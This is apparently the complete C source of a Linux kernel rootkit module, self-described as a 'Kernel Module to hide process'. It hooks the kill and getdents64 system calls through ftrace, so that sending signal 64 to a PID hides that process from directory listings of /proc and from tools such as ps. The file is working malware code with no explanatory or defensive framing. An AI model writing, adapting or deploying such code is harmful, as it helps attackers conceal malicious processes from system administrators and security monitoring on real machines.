#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#include "ftrace_helper.h"

/**/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noctamine");
MODULE_DESCRIPTION("Kernel Module to hide process");
MODULE_VERSION("1");
/**/

char hide_pid[NAME_MAX];

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);


asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == 64)
    {
        printk(KERN_INFO "hiding process with pid %d\n", pid);
		sprintf(hide_pid, "%d", pid);
        return 0;
    }

    return orig_kill(regs);
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init ft_init_module(void)
{
	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "kernel module loaded !\n");
	return (0);
}

static void __exit ft_exit_module(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "kernel module unloaded");
}

module_init(ft_init_module);
module_exit(ft_exit_module);
